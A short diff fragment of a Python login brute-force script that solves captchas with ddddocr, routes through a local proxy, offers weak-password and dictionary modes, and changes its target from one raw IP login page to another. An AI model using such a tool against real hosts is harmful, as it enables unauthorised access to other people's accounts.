@@ -7,14 +7,14 @@ import sys
 path = os.path.dirname(os.path.abspath(__file__))
 requests.packages.urllib3.disable_warnings()
 ocr = ddddocr.DdddOcr()
-proxies = {"http": "http://127.0.0.1:12345"}#代理
+proxies = {"http": "http://127.0.0.1:6002"}#代理
 print(f'''
 --------------------------
 main.py -r        #弱口令
 main.py xxx.txt   #字典爆破
 默认使用的代理:{proxies}
 ''')
-url="https://107.174.115.223/user/login"
+url="https://47.92.107.67/user/login"
 def userpassbp(result,file,ints): #爆破
     headersbp = {
         'Cookie': 'PHPSESSID=9cee9522237b174d1bb39e30be105cd5',
